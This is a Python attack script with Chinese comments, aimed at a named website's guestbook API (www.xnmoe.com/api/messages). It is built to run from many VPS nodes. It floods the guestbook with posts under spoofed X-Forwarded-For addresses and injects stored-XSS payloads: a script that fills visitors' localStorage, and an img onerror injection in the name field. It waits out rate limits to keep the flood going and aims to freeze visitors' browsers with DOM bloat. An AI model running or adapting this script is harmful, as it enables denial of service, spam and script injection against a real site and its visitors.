#!/usr/bin/env python3
"""
前端磁盘写满攻击 - localStorage/IndexedDB + DOM 膨胀
20 VPS 分布式向留言板灌入 payload，目标：
  1. 如果 XSS 生效 → 写满 localStorage (5-10MB)
  2. 即使用文本 → 海量 DOM 节点让浏览器卡死
"""
import http.client, json, os, time, threading, random, base64, ssl

URL_HOST = "www.xnmoe.com"
URL_PATH = "/api/messages"
THREADS = int(os.environ.get("THREADS", "3"))
NODE_ID = os.environ.get("NODE_ID", "0")
DURATION = int(os.environ.get("DURATION", "240"))

# === localStorage 写满 payload (如果 XSS 生效) ===
LS_FILL_JS = """
<script>
(function(){
  var s='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var chunk=''; for(var i=0;i<50000;i++)chunk+=s;
  var n=0; try{
    while(1){localStorage.setItem('fill'+n,chunk);n++;}
  }catch(e){
    document.title='LS_FULL:'+n+'x50KB='+(n*50/1000)+'MB';
  }
})();
</scrip">
""".strip().replace('\n',' ')

# 没有 XSS 时的普通文本（200字符上限）
FILL_TEXT = "A" * 200

stats = {"ok": 0, "err": 0, "mb": 0.0}
lock = threading.Lock()
running = True
t0 = time.time()


def build_payload(use_xss=True):
    """构建留言 payload"""
    # 多种 user.name 尝试（可能某些不被转义）
    names = [
        f"Guest_{NODE_ID}_{random.randint(1000,9999)}",
        f'"><img src=x onerror="'+LS_FILL_JS[:30]+'"',
        f"Visitor_{random.randint(1,99999)}",
    ]
    
    # 尝试在 content 中嵌入 JS（即使被转义也占空间）
    content = LS_FILL_JS if use_xss else FILL_TEXT[:200]
    
    body = {
        "content": content[:200],  # 截断到 200 字符
        "user": {
            "name": random.choice(names),
            "avatar": "",
            "url": "https://xnmoe.com",
            "user_type": "guest"
        },
        "client_info": "Win/Chrome"
    }
    return json.dumps(body)


def send(tid, seq, use_xss):
    """发送单条留言"""
    ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    body = build_payload(use_xss)
    body_size = len(body)
    
    try:
        conn = http.client.HTTPSConnection(URL_HOST, timeout=30)
        conn.request("POST", URL_PATH, body, {
            "Content-Type": "application/json",
            "X-Forwarded-For": ip,
            "Origin": "https://www.xnmoe.com",
            "Referer": "https://www.xnmoe.com/guestbook.html",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) GH-{NODE_ID}"
        })
        r = conn.getresponse()
        code = r.status
        r.read()
        conn.close()
        
        if code == 200:
            with lock:
                stats["ok"] += 1
                stats["mb"] += body_size / (1024 * 1024)
        else:
            with lock:
                stats["err"] += 1
        return code
    except Exception as e:
        with lock:
            stats["err"] += 1
        return -1


def worker(tid):
    """工作线程"""
    seq = 0
    xss_mode = False  # 交替使用 XSS payload 和普通文本
    
    while running:
        seq += 1
        xss_mode = (seq % 3 == 0)  # 每 3 次用一次 XSS payload
        
        code = send(tid, seq, xss_mode)
        
        with lock:
            ok, err = stats["ok"], stats["err"]
        
        if code == 200:
            if ok % 50 == 0:
                with lock:
                    print(f"  [{NODE_ID}] #{ok} OK  err={err}  Σ{stats['mb']:.1f}MB", flush=True)
            time.sleep(0.5)  # 成功时快速发送
        elif code == 429:
            time.sleep(3)   # 被限速则等待
        else:
            time.sleep(1)


def main():
    global running
    print(f"\n{'='*50}")
    print(f" 前端磁盘写满 | VPS={NODE_ID} | {THREADS}线程")
    print(f" 目标: {URL_HOST}{URL_PATH}")
    print(f" 策略: XSS localStorage填充 + DOM膨胀")
    print(f"{'='*50}\n", flush=True)
    
    # 启动工作线程
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(i+1,), daemon=True)
        t.start()
    
    # 状态报告循环
    deadline = time.time() + DURATION
    while time.time() < deadline:
        time.sleep(15)
        with lock:
            ok, err, mb = stats["ok"], stats["err"], stats["mb"]
        elapsed = time.time() - t0
        rate = ok / elapsed if elapsed > 0 else 0
        remaining = max(0, deadline - time.time())
        print(f"  [{time.strftime('%H:%M:%S')}] {elapsed:.0f}s | OK:{ok} ERR:{err} | {mb:.2f}MB | {rate:.1f}msg/s | {remaining:.0f}s left", flush=True)
    
    running = False
    time.sleep(2)
    
    with lock:
        ok, err, mb = stats["ok"], stats["err"], stats["mb"]
    elapsed = time.time() - t0
    
    print(f"\n{'='*50}")
    print(f" [VPS {NODE_ID}] FINAL: {ok} ok, {err} err, {mb:.2f}MB")
    print(f" 速率: {ok/elapsed:.1f} msg/s")
    print(f"{'='*50}\n", flush=True)


if __name__ == "__main__":
    main()
